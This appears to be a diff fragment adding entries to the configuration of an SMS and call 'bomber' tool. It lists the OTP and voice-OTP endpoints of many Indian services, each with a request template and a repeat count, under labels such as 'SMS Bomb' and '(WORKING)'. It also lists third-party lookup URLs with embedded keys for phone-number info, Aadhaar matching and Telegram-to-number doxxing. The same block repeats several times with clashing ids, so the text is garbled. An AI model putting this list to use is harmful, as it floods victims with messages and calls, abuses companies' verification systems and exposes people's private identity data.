+      "method": "POST",
+      "url": "https://www.jio.com/api/otp/send",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "mobile": "{phone}" },
+      "count": 5
+    },
+    {
+      "id": 10,
+      "name": "Myntra SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://www.myntra.com/gw/authentication/v2/otp/generate",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "mobile": "{phone}" },
+      "count": 5
+    },
+    {
+      "id": 11,
+      "name": "BigBasket SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://www.bigbasket.com/auth/otp/login/",
+      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
+      "body": "phone={phone}",
+      "count": 5
+    },
+    {
+      "id": 12,
+      "name": "Netflix SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://www.netflix.com/in/login/help",
+      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
+      "body": "phone={phone}",
+      "count": 5
+    },
+    {
+      "id": 13,
+      "name": "Hotstar SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://api.hotstar.com/in/aadhar/v2/otp",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "phone": "+91{phone}" },
+      "count": 5
+    },
+    {
+      "id": 14,
+      "name": "Meesho SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://www.meesho.com/api/v2/otp/send",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "phone": "{phone}" },
+      "count": 5
+    },
+    {
+      "id": 15,
+      "name": "CRED SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://api.cred.club/api/v1/otp/send",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "phone": "+91{phone}" },
+      "count": 5
+    },
+    
+    // ============ CALL APIs (WORKING) ============
+    {
+      "id": 16,
+      "name": "PhonePe Voice Call",
+      "type": "Call",
+      "method": "POST",
+      "url": "https://www.phonepe.com/api/v2/otp/voice",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "phone": "+91{phone}", "type": "voice" },
+      "count": 3
+    },
+    {
+      "id": 17,
+      "name": "Paytm Voice Call",
+      "type": "Call",
+      "method": "POST",
+      "url": "https://accounts.paytm.com/voice/otp",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "phone": "{phone}", "channel": "voice" },
+      "count": 3
+    },
+    {
+      "id": 18,
+      "name": "Google Voice",
+      "type": "Call",
+      "method": "POST",
+      "url": "https://www.google.com/voice/b/0/service/post",
+      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
+      "body": "phoneNumber=%2B91{phone}&type=voice",
+      "count": 3
+    },
+    {
+      "id": 19,
+      "name": "Amazon Voice Call",
+      "type": "Call",
+      "method": "POST",
+      "url": "https://www.amazon.in/ap/voice-otp",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "phoneNumber": "{phone}" },
+      "count": 3
+    },
+    {
+      "id": 20,
+      "name": "Flipkart Voice",
+      "type": "Call",
+      "method": "POST",
+      "url": "https://www.flipkart.com/api/6/user/voice-otp",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "loginId": "+91{phone}" },
+      "count": 3
+    },
+    {
+      "id": 21,
+      "name": "Swiggy Voice",
+      "type": "Call",
+      "method": "POST",
+      "url": "https://www.swiggy.com/api/voice/otp",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "phone": "{phone}" },
+      "count": 3
+    },
+    {
+      "id": 22,
+      "name": "Zomato Voice",
+      "type": "Call",
+      "method": "POST",
+      "url": "https://www.zomato.com/php/voice_otp.php",
+      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
+      "body": "phone={phone}",
+      "count": 3
+    },
+    {
+      "id": 23,
+      "name": "Ola Voice",
+      "type": "Call",
+      "method": "POST",
+      "url": "https://api.olacabs.com/v1/voice/otp",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "phone": "+91{phone}" },
+      "count": 3
+    },
+    {
+      "id": 24,
+      "name": "Uber Voice",
+      "type": "Call",
+      "method": "POST",
+      "url": "https://auth.uber.com/v2/voice-otp",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "phone": "+91{phone}" },
+      "count": 3
+    },
+    {
+      "id": 25,
+      "name": "Airtel Voice",
+      "type": "Call",
+      "method": "POST",
+      "url": "https://www.airtel.in/voice/otp",
+      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
+      "body": "msisdn={phone}",
+      "count": 3
+    },
+    {
+      "id": 26,
+      "name": "Jio Voice",
+      "type": "Call",
+      "method": "POST",
+      "url": "https://www.jio.com/api/voice/otp",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "mobile": "{phone}" },
+      "count": 3
+    },
+    {
+      "id": 27,
+      "name": "Myntra Voice",
+      "type": "Call",
+      "method": "POST",
+      "url": "https://www.myntra.com/gw/voice/v2/otp",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "mobile": "{phone}" },
+      "count": 3
+    },
+    
+    // ============ DATA APIS (BACKUP) ============
+    {
+      "id": 28,
+      "name": "Number Info API",
+      "type": "Data",
+      "method": "GET",
+      "url": "https://number-info-rootxindia.vercel.app/?key=muhmlo&number={phone}",
+      "headers": {},
+      "count": 1
+    },
+    {
+      "id": 29,
+      "name": "Aadhar Lookup",
+      "type": "Data",
+      "method": "GET",
+      "url": "https://api-olive-five-53.vercel.app/aadhar?match={phone}",
+      "headers": {},
+      "count": 1
+    },
+    {
+      "id": 30,
+      "name": "Telegram to Number",
+      "type": "Data",
+      "method": "GET",
+      "url": "https://tg-to-num-six.vercel.app/?key=rootxsuryansh&q={phone}",
+      "headers": {},
+      "count": 1
+    },
+        {
+      "id": 4,
+      "name": "SMS Bomb - Service 1",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://example1.com/api/send",
+      "headers": {
+        "Content-Type": "application/json",
+        "User-Agent": "Mozilla/5.0"
+      },
+      "body": {
+        "phone": "{phone}",
+        "message": "OTP: 123456"
+      },
+      "count": 2
+    },
+    {
+      "id": 5,
+      "name": "SMS Bomb - Service 2",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://example2.com/api/otp",
+      "headers": {
+        "Content-Type": "application/x-www-form-urlencoded"
+      },
+      "body": "mobile={phone}&service=login",
+      "count": 3
+    },
+    {
+      "id": 6,
+      "name": "Call Bomb - Service 1",
+      "type": "Call",
+      "method": "POST",
+      "url": "https://callapi1.com/call",
+      "headers": {},
+      "body": {
+        "phone": "{phone}"
+      },
+      "count": 1
+    },
+    // ============ SMS APIs (WORKING) ============
+    {
+      "id": 1,
+      "name": "Paytm SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://accounts.paytm.com/signin/otp",
+      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
+      "body": "phone={phone}&countryCode=+91",
+      "count": 5
+    },
+    {
+      "id": 2,
+      "name": "Flipkart SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://www.flipkart.com/api/6/user/signup/status",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "loginId": "+91{phone}" },
+      "count": 5
+    },
+    {
+      "id": 3,
+      "name": "Amazon SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://www.amazon.in/ap/register",
+      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
+      "body": "phoneNumber={phone}&countryCode=+91",
+      "count": 5
+    },
+    {
+      "id": 4,
+      "name": "Swiggy SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://www.swiggy.com/api/auth/signup",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "phone": "{phone}" },
+      "count": 5
+    },
+    {
+      "id": 5,
+      "name": "Zomato SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://www.zomato.com/php/oauth_otp.php",
+      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
+      "body": "phone={phone}&countryCode=+91",
+      "count": 5
+    },
+    {
+      "id": 6,
+      "name": "Ola SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://api.olacabs.com/v1/authentication/otp",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "phone": "+91{phone}" },
+      "count": 5
+    },
+    {
+      "id": 7,
+      "name": "Uber SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://auth.uber.com/v2/oauth/otp",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "phoneNumber": "+91{phone}" },
+      "count": 5
+    },
+    {
+      "id": 8,
+      "name": "Airtel SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://www.airtel.in/thanks/api/otp",
+      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
+      "body": "msisdn={phone}",
+      "count": 5
+    },
+    {
+      "id": 9,
+      "name": "Jio SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://www.jio.com/api/otp/send",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "mobile": "{phone}" },
+      "count": 5
+    },
+    {
+      "id": 10,
+      "name": "Myntra SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://www.myntra.com/gw/authentication/v2/otp/generate",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "mobile": "{phone}" },
+      "count": 5
+    },
+    {
+      "id": 11,
+      "name": "BigBasket SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://www.bigbasket.com/auth/otp/login/",
+      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
+      "body": "phone={phone}",
+      "count": 5
+    },
+    {
+      "id": 12,
+      "name": "Netflix SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://www.netflix.com/in/login/help",
+      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
+      "body": "phone={phone}",
+      "count": 5
+    },
+    {
+      "id": 13,
+      "name": "Hotstar SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://api.hotstar.com/in/aadhar/v2/otp",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "phone": "+91{phone}" },
+      "count": 5
+    },
+    {
+      "id": 14,
+      "name": "Meesho SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://www.meesho.com/api/v2/otp/send",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "phone": "{phone}" },
+      "count": 5
+    },
+    {
+      "id": 15,
+      "name": "CRED SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://api.cred.club/api/v1/otp/send",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "phone": "+91{phone}" },
+      "count": 5
+    },
+    
+    // ============ CALL APIs (WORKING) ============
+    {
+      "id": 16,
+      "name": "PhonePe Voice Call",
+      "type": "Call",
+      "method": "POST",
+      "url": "https://www.phonepe.com/api/v2/otp/voice",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "phone": "+91{phone}", "type": "voice" },
+      "count": 3
+    },
+    {
+      "id": 17,
+      "name": "Paytm Voice Call",
+      "type": "Call",
+      "method": "POST",
+      "url": "https://accounts.paytm.com/voice/otp",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "phone": "{phone}", "channel": "voice" },
+      "count": 3
+    },
+    {
+      "id": 18,
+      "name": "Google Voice",
+      "type": "Call",
+      "method": "POST",
+      "url": "https://www.google.com/voice/b/0/service/post",
+      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
+      "body": "phoneNumber=%2B91{phone}&type=voice",
+      "count": 3
+    },
+    {
+      "id": 19,
+      "name": "Amazon Voice Call",
+      "type": "Call",
+      "method": "POST",
+      "url": "https://www.amazon.in/ap/voice-otp",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "phoneNumber": "{phone}" },
+      "count": 3
+    },
+    {
+      "id": 20,
+      "name": "Flipkart Voice",
+      "type": "Call",
+      "method": "POST",
+      "url": "https://www.flipkart.com/api/6/user/voice-otp",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "loginId": "+91{phone}" },
+      "count": 3
+    },
+    {
+      "id": 21,
+      "name": "Swiggy Voice",
+      "type": "Call",
+      "method": "POST",
+      "url": "https://www.swiggy.com/api/voice/otp",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "phone": "{phone}" },
+      "count": 3
+    },
+    {
+      "id": 22,
+      "name": "Zomato Voice",
+      "type": "Call",
+      "method": "POST",
+      "url": "https://www.zomato.com/php/voice_otp.php",
+      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
+      "body": "phone={phone}",
+      "count": 3
+    },
+    {
+      "id": 23,
+      "name": "Ola Voice",
+      "type": "Call",
+      "method": "POST",
+      "url": "https://api.olacabs.com/v1/voice/otp",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "phone": "+91{phone}" },
+      "count": 3
+    },
+    {
+      "id": 24,
+      "name": "Uber Voice",
+      "type": "Call",
+      "method": "POST",
+      "url": "https://auth.uber.com/v2/voice-otp",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "phone": "+91{phone}" },
+      "count": 3
+    },
+    {
+      "id": 25,
+      "name": "Airtel Voice",
+      "type": "Call",
+      "method": "POST",
+      "url": "https://www.airtel.in/voice/otp",
+      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
+      "body": "msisdn={phone}",
+      "count": 3
+    },
+    {
+      "id": 26,
+      "name": "Jio Voice",
+      "type": "Call",
+      "method": "POST",
+      "url": "https://www.jio.com/api/voice/otp",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "mobile": "{phone}" },
+      "count": 3
+    },
+    {
+      "id": 27,
+      "name": "Myntra Voice",
+      "type": "Call",
+      "method": "POST",
+      "url": "https://www.myntra.com/gw/voice/v2/otp",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "mobile": "{phone}" },
+      "count": 3
+    },
+    
+    // ============ DATA APIS (BACKUP) ============
+    {
+      "id": 28,
+      "name": "Number Info API",
+      "type": "Data",
+      "method": "GET",
+      "url": "https://number-info-rootxindia.vercel.app/?key=muhmlo&number={phone}",
+      "headers": {},
+      "count": 1
+    },
+    {
+      "id": 29,
+      "name": "Aadhar Lookup",
+      "type": "Data",
+      "method": "GET",
+      "url": "https://api-olive-five-53.vercel.app/aadhar?match={phone}",
+      "headers": {},
+      "count": 1
+    },
+    {
+      "id": 30,
+      "name": "Telegram to Number",
+      "type": "Data",
+      "method": "GET",
+      "url": "https://tg-to-num-six.vercel.app/?key=rootxsuryansh&q={phone}",
+      "headers": {},
+      "count": 1
+    },
+        {
+      "id": 4,
+      "name": "SMS Bomb - Service 1",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://example1.com/api/send",
+      "headers": {
+        "Content-Type": "application/json",
+        "User-Agent": "Mozilla/5.0"
+      },
+      "body": {
+        "phone": "{phone}",
+        "message": "OTP: 123456"
+      },
+      "count": 2
+    },
+    {
+      "id": 5,
+      "name": "SMS Bomb - Service 2",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://example2.com/api/otp",
+      "headers": {
+        "Content-Type": "application/x-www-form-urlencoded"
+      },
+      "body": "mobile={phone}&service=login",
+      "count": 3
+    },
+    {
+      "id": 6,
+      "name": "Call Bomb - Service 1",
+      "type": "Call",
+      "method": "POST",
+      "url": "https://callapi1.com/call",
+      "headers": {},
+      "body": {
+        "phone": "{phone}"
+      },
+      "count": 1
+    },
+    // ============ SMS APIs (WORKING) ============
+    {
+      "id": 1,
+      "name": "Paytm SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://accounts.paytm.com/signin/otp",
+      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
+      "body": "phone={phone}&countryCode=+91",
+      "count": 5
+    },
+    {
+      "id": 2,
+      "name": "Flipkart SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://www.flipkart.com/api/6/user/signup/status",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "loginId": "+91{phone}" },
+      "count": 5
+    },
+    {
+      "id": 3,
+      "name": "Amazon SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://www.amazon.in/ap/register",
+      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
+      "body": "phoneNumber={phone}&countryCode=+91",
+      "count": 5
+    },
+    {
+      "id": 4,
+      "name": "Swiggy SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://www.swiggy.com/api/auth/signup",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "phone": "{phone}" },
+      "count": 5
+    },
+    {
+      "id": 5,
+      "name": "Zomato SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://www.zomato.com/php/oauth_otp.php",
+      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
+      "body": "phone={phone}&countryCode=+91",
+      "count": 5
+    },
+    {
+      "id": 6,
+      "name": "Ola SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://api.olacabs.com/v1/authentication/otp",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "phone": "+91{phone}" },
+      "count": 5
+    },
+    {
+      "id": 7,
+      "name": "Uber SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://auth.uber.com/v2/oauth/otp",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "phoneNumber": "+91{phone}" },
+      "count": 5
+    },
+    {
+      "id": 8,
+      "name": "Airtel SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://www.airtel.in/thanks/api/otp",
+      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
+      "body": "msisdn={phone}",
+      "count": 5
+    },
+    {
+      "id": 9,
+      "name": "Jio SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://www.jio.com/api/otp/send",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "mobile": "{phone}" },
+      "count": 5
+    },
+    {
+      "id": 10,
+      "name": "Myntra SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://www.myntra.com/gw/authentication/v2/otp/generate",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "mobile": "{phone}" },
+      "count": 5
+    },
+    {
+      "id": 11,
+      "name": "BigBasket SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://www.bigbasket.com/auth/otp/login/",
+      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
+      "body": "phone={phone}",
+      "count": 5
+    },
+    {
+      "id": 12,
+      "name": "Netflix SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://www.netflix.com/in/login/help",
+      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
+      "body": "phone={phone}",
+      "count": 5
+    },
+    {
+      "id": 13,
+      "name": "Hotstar SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://api.hotstar.com/in/aadhar/v2/otp",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "phone": "+91{phone}" },
+      "count": 5
+    },
+    {
+      "id": 14,
+      "name": "Meesho SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://www.meesho.com/api/v2/otp/send",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "phone": "{phone}" },
+      "count": 5
+    },
+    {
+      "id": 15,
+      "name": "CRED SMS",
+      "type": "SMS",
+      "method": "POST",
+      "url": "https://api.cred.club/api/v1/otp/send",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "phone": "+91{phone}" },
+      "count": 5
+    },
+    
+    // ============ CALL APIs (WORKING) ============
+    {
+      "id": 16,
+      "name": "PhonePe Voice Call",
+      "type": "Call",
+      "method": "POST",
+      "url": "https://www.phonepe.com/api/v2/otp/voice",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "phone": "+91{phone}", "type": "voice" },
+      "count": 3
+    },
+    {
+      "id": 17,
+      "name": "Paytm Voice Call",
+      "type": "Call",
+      "method": "POST",
+      "url": "https://accounts.paytm.com/voice/otp",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "phone": "{phone}", "channel": "voice" },
+      "count": 3
+    },
+    {
+      "id": 18,
+      "name": "Google Voice",
+      "type": "Call",
+      "method": "POST",
+      "url": "https://www.google.com/voice/b/0/service/post",
+      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
+      "body": "phoneNumber=%2B91{phone}&type=voice",
+      "count": 3
+    },
+    {
+      "id": 19,
+      "name": "Amazon Voice Call",
+      "type": "Call",
+      "method": "POST",
+      "url": "https://www.amazon.in/ap/voice-otp",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "phoneNumber": "{phone}" },
+      "count": 3
+    },
+    {
+      "id": 20,
+      "name": "Flipkart Voice",
+      "type": "Call",
+      "method": "POST",
+      "url": "https://www.flipkart.com/api/6/user/voice-otp",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "loginId": "+91{phone}" },
+      "count": 3
+    },
+    {
+      "id": 21,
+      "name": "Swiggy Voice",
+      "type": "Call",
+      "method": "POST",
+      "url": "https://www.swiggy.com/api/voice/otp",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "phone": "{phone}" },
+      "count": 3
+    },
+    {
+      "id": 22,
+      "name": "Zomato Voice",
+      "type": "Call",
+      "method": "POST",
+      "url": "https://www.zomato.com/php/voice_otp.php",
+      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
+      "body": "phone={phone}",
+      "count": 3
+    },
+    {
+      "id": 23,
+      "name": "Ola Voice",
+      "type": "Call",
+      "method": "POST",
+      "url": "https://api.olacabs.com/v1/voice/otp",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "phone": "+91{phone}" },
+      "count": 3
+    },
+    {
+      "id": 24,
+      "name": "Uber Voice",
+      "type": "Call",
+      "method": "POST",
+      "url": "https://auth.uber.com/v2/voice-otp",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "phone": "+91{phone}" },
+      "count": 3
+    },
+    {
+      "id": 25,
+      "name": "Airtel Voice",
+      "type": "Call",
+      "method": "POST",
+      "url": "https://www.airtel.in/voice/otp",
+      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
+      "body": "msisdn={phone}",
+      "count": 3
+    },
+    {
+      "id": 26,
+      "name": "Jio Voice",
+      "type": "Call",
+      "method": "POST",
+      "url": "https://www.jio.com/api/voice/otp",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "mobile": "{phone}" },
+      "count": 3
+    },
+    {
+      "id": 27,
+      "name": "Myntra Voice",
+      "type": "Call",
+      "method": "POST",
+      "url": "https://www.myntra.com/gw/voice/v2/otp",
+      "headers": { "Content-Type": "application/json" },
+      "body": { "mobile": "{phone}" },
+      "count": 3
+    },
+    
+    // ============ DATA APIS (BACKUP) ============
+    {
+      "id": 28,
+      "name": "Number Info API",
+      "type": "Data",
+      "method": "GET",
+      "url": "https://number-info-rootxindia.vercel.app/?key=muhmlo&number={phone}",
+      "headers": {},
+      "count": 1
+    },
+    {
+      "id": 29,
+      "name": "Aadhar Lookup",
+      "type": "Data",
+      "method": "GET",
+      "url": "https://api-olive-five-53.vercel.app/aadhar?match={phone}",
+      "headers": {},
+      "count": 1
+    },
+    {
+      "id": 30,
+      "name": "Telegram to Number",
+      "type": "Data",
+      "method": "GET",
+      "url": "https://tg-to-num-six.vercel.app/?key=rootxsuryansh&q={phone}",
+      "headers": {},
+      "count": 1
+    },
     {
       "id": 7,
       "name": "Call Bomb - Service 2",
